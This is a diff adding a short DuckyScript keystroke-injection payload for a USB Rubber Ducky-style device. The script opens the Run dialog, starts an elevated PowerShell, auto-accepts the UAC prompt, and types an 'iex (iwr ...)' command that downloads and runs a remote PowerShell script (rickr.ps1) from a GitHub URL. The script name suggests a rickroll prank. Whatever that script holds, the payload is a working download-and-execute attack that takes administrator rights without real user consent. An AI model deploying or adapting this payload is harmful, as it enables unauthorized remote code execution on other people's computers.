@@ -1,0 +1,16 @@
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Type PowerShell command to open it as admin
+STRING powershell -Command "Start-Process PowerShell -Verb RunAs"
+ENTER
+DELAY 1000
+
+REM Confirm UAC (User Account Control) prompt
+ALT y
+DELAY 1000
+
+REM Call the rickr.ps1 script from GitHub using iex
+STRING iex (iwr 'https://github.com/Kiraryh/sub/blob/main/rickr.ps1' -UseBasicParsing)
+ENTER
